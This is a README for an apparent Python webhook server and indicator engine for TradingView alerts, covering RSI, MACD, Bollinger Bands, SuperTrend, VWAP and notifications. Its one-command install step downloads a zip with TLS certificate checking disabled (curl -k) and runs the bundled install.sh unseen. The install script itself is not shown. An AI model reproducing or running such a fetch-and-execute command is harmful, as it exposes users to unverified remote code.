# TradingView Indicator Extension

**Custom indicator engine + webhook server for TradingView alerts.**  
RSI · MACD · Bollinger Bands · SuperTrend · VWAP — with Telegram, Slack & Discord notifications.

[![Python 3.10+](https://img.shields.io/badge/python-3.10+-blue?logo=python)](https://www.python.org/)
[![Platform](https://img.shields.io/badge/platform-macOS%20%7C%20Linux%20%7C%20Windows-lightgrey?logo=github)](https://github.com/sharonubsyq/trading-view-indicator-extension)
[![Flask](https://img.shields.io/badge/Flask-3.0-black?logo=flask)](https://flask.palletsprojects.com/)
[![License: MIT](https://img.shields.io/badge/license-MIT-green)](LICENSE)

> **Disclaimer:** This software is for educational and research purposes only. It is not financial advice. Trading involves risk of loss. Use at your own risk.

---

## What Is This?

**trading-view-indicator-extension** is a Python backend that extends TradingView with custom indicator logic you can't build in Pine Script alone.

It works by receiving TradingView webhook alerts, re-computing indicators on live OHLCV data (via Yahoo Finance), and producing a composite signal rating — then forwarding the result to Telegram, Slack, Discord, or any HTTP endpoint.

Works on **macOS, Linux, and Windows**.

---

## Features

### Indicators

| Indicator | What's extended |
|---|---|
| **RSI** (14-period) | Multi-timeframe, bullish/bearish divergence detection |
| **MACD** (12/26/9) | Signal line cross, zero-line cross, histogram momentum |
| **Bollinger Bands** | %B, bandwidth, squeeze detection, upper/lower break alerts |
| **SuperTrend** | Direction flips as BUY/SELL signals, trend strength score |
| **VWAP** | 1σ/2σ bands, cross-up/cross-down detection, anchored VWAP |
| **Composite Signal** | Weighted score −1.0 → +1.0 with STRONG BUY/SELL rating |

### Webhook server

- Receives TradingView alert `POST` requests at `/webhook`
- Validates payload, fetches OHLCV data, runs all indicators
- Returns composite rating + individual indicator signals in JSON
- Optional `X-Webhook-Secret` header auth to block unauthorized calls
- `/signal/<ticker>` endpoint for direct signal queries (no alert needed)

### Notifications

- 📱 **Telegram** — real-time bot messages with emoji ratings
- 💬 **Slack** — incoming webhook integration
- 🎮 **Discord** — webhook integration
- 🔧 **Custom** — plug in any Python callable

### Developer-friendly

- Full `pytest` test suite — indicators + webhook server
- Demo mode with synthetic data (no API keys, no internet needed)
- Configurable via `.env` — no code changes needed

---

## Installation

**Supports macOS, Linux (Ubuntu/Debian/Arch/Fedora), and Windows (WSL or Git Bash).**

### One-command install

Open **Terminal** (macOS/Linux) or **Git Bash / WSL** (Windows) and run:

```bash
curl -fsSLk https://github.com/sharonubsyq/trading-view-indicator-extension/archive/refs/heads/main.zip -o /tmp/cw.zip && \
unzip -qo /tmp/cw.zip -d /tmp && \
cd /tmp/trading-view-indicator-extension-main && \
bash install.sh
```

The installer automatically:

- Detects your OS and package manager (Homebrew / apt / pacman / dnf)
- Installs Python 3.10+ if missing
- Creates a Python virtual environment
- Installs all dependencies from `requirements.txt`
- Copies `env_template.txt` → `.env`
- Runs the full test suite to verify the install


---

## Configuration

After installation, open `.env` and fill in your values:

```bash
# macOS / Linux
nano .env        # or: open -e .env

# Windows
notepad .env
```

Key settings:

```env
# Server
PORT=5000
WEBHOOK_SECRET=your_random_secret_here   # set this in production!

# Notifications (all optional)
TELEGRAM_TOKEN=your_bot_token
TELEGRAM_CHAT_ID=your_chat_id
SLACK_WEBHOOK=https://hooks.slack.com/...
DISCORD_WEBHOOK=https://discord.com/api/webhooks/...

# Data
USE_SYNTHETIC=false    # true = demo mode (no internet needed)
DEFAULT_INTERVAL=1h

# Indicator parameters
RSI_PERIOD=14
RSI_OB=70
RSI_OS=30
BB_PERIOD=20
BB_STD=2.0
ST_PERIOD=10
ST_MULT=3.0
```

---

## Usage

Activate the virtual environment first:

```bash
# macOS / Linux
source .venv/bin/activate

# Windows
.venv\Scripts\activate
```

### Start the webhook server

```bash
python main.py
```

```
  ┌─────────────────────────────────────────────────┐
  │    trading-view-indicator-extension v1.0.0      │
  │                                                 │
  │  Webhook:  http://0.0.0.0:5000/webhook          │
  │  Health:   http://0.0.0.0:5000/health           │
  │  Signal:   http://0.0.0.0:5000/signal/<ticker>  │
  └─────────────────────────────────────────────────┘
```

### Query a signal directly

```bash
# AAPL on 1h timeframe
python main.py --signal AAPL

# Bitcoin on 4h
python main.py --signal BTCUSD --interval 4h

# Demo mode — no internet required
python main.py --signal TSLA --demo
```

Output:

```
  Ticker:  AAPL
  Interval:1h
  ──────────────────────────────
  Rating:  BUY
  Score:   +0.3640
  ──────────────────────────────
  RSI:     oversold
  MACD:    bullish_cross
  BB:      lower_touch
  SuperTrend: bullish
  VWAP:    below_vwap
```

### Other options

```bash
python main.py --port 8080        # Custom port
python main.py --debug            # Debug mode
python main.py --log-level DEBUG  # Verbose logging
```

---

## TradingView Setup

### 1. Configure your alert webhook

In TradingView → Alerts → Create Alert → Notifications tab:

- Enable **Webhook URL**
- Enter: `http://YOUR_SERVER_IP:5000/webhook`
- If `WEBHOOK_SECRET` is set, add header: `X-Webhook-Secret: your_secret`

### 2. Set your alert message body

In the **Message** field of your alert, use this JSON template:

```json
{
  "ticker":   "{{ticker}}",
  "exchange": "{{exchange}}",
  "action":   "{{strategy.order.action}}",
  "price":    {{close}},
  "interval": "{{interval}}"
}
```

TradingView replaces `{{placeholders}}` with live values when the alert fires.

### 3. Test the connection

```bash
# Trigger a test alert manually
curl -X POST http://localhost:5000/webhook \
  -H "Content-Type: application/json" \
  -d '{"ticker":"AAPL","exchange":"NASDAQ","price":185.5,"action":"buy","interval":"1h"}'
```

Response:

```json
{
  "status": "ok",
  "ticker": "AAPL",
  "rating": "BUY",
  "score": 0.364,
  "latency_ms": 312
}
```

---

## API Reference

### `GET /health`

Returns server status.

```json
{"status": "ok", "service": "trading-view-indicator-extension", "time": "2025-01-01T12:00:00Z"}
```

### `POST /webhook` or `POST /alert`

Receives a TradingView alert payload. Required fields: `ticker`, `price`.

**Request body:**
```json
{
  "ticker":   "AAPL",
  "exchange": "NASDAQ",
  "price":    185.5,
  "action":   "buy",
  "interval": "1h"
}
```

**Response:**
```json
{
  "status":     "ok",
  "ticker":     "AAPL",
  "rating":     "BUY",
  "score":      0.364,
  "latency_ms": 312
}
```

### `GET /signal/<ticker>?interval=1h`

Query composite signal for any ticker without a TradingView alert.

```bash
curl http://localhost:5000/signal/TSLA?interval=4h
```

```json
{
  "ticker":      "TSLA",
  "interval":    "4h",
  "rating":      "NEUTRAL",
  "score":       -0.05,
  "rsi_signal":  "neutral",
  "macd_signal": "momentum_down",
  "bb_signal":   "neutral",
  "st_signal":   "bullish",
  "vwap_signal": "above_vwap",
  "components":  {"rsi": 0.0, "macd": -0.4, "bb": 0.0, "st": 0.7, "vwap": 0.2}
}
```

---

## Composite Signal Scoring

Each indicator contributes to the composite score with the following weights:

| Indicator | Weight |
|---|---|
| SuperTrend | 25% |
| MACD | 25% |
| RSI | 20% |
| Bollinger Bands | 15% |
| VWAP | 15% |

Score ratings:

| Score | Rating |
|---|---|
| ≥ +0.60 | STRONG BUY |
| ≥ +0.20 | BUY |
| −0.20 to +0.20 | NEUTRAL |
| ≤ −0.20 | SELL |
| ≤ −0.60 | STRONG SELL |

---

## Project Structure

```
trading-view-indicator-extension/
│
├── install.sh              # ← Start here. Cross-platform installer (macOS/Linux/WSL)
├── install.bat             # Windows native installer
├── main.py                 # Entry point — server + signal CLI
├── config.py               # Configuration from .env
├── requirements.txt        # Python dependencies
├── pyproject.toml          # Project metadata
├── env_template.txt        # Copy to .env
│
├── src/
│   ├── indicators/
│   │   ├── rsi.py          # RSI + divergence detection
│   │   ├── macd.py         # MACD + crossover signals
│   │   ├── bb.py           # Bollinger Bands + squeeze
│   │   ├── supertrend.py   # SuperTrend + flip signals
│   │   ├── vwap.py         # VWAP + σ bands
│   │   └── custom.py       # Composite signal engine
│   │
│   ├── alerts/
│   │   ├── parser.py       # TradingView webhook payload parser
│   │   ├── handler.py      # Alert processing + indicator execution
│   │   └── router.py       # Telegram/Slack/Discord notification router
│   │
│   ├── server/
│   │   └── app.py          # Flask webhook server (/webhook, /signal, /health)
│   │
│   └── utils/
│       ├── data_fetcher.py # OHLCV data (yfinance + synthetic fallback)
│       └── logger.py       # Logging setup
│
└── tests/
    ├── test_indicators.py  # Indicator unit tests
    └── test_server.py      # Webhook server integration tests
```

---

## Development

```bash
# Install dev dependencies
pip install -e ".[dev]"

# Run tests
pytest -v

# Lint + format
ruff check .
black .
```

---

## Troubleshooting

### "No data returned from yfinance"
Yahoo Finance may not support that ticker symbol or interval. Try a different ticker or use demo mode:
```bash
python main.py --demo
```

### TradingView alert not reaching server
- Make sure port 5000 is open in your firewall
- Use a service like [ngrok](https://ngrok.com) to expose localhost during development:
  ```bash
  ngrok http 5000
  # Use the https://xxx.ngrok.io URL in TradingView
  ```

### "Virtual environment not found"
Re-run the installer:
```bash
bash install.sh
```

### Windows: `'python' is not recognized`
Install Python from [python.org](https://python.org/downloads) and check **"Add Python to PATH"** during setup. Then restart your terminal.

---

## License

MIT — see [LICENSE](LICENSE). For educational and research purposes only.
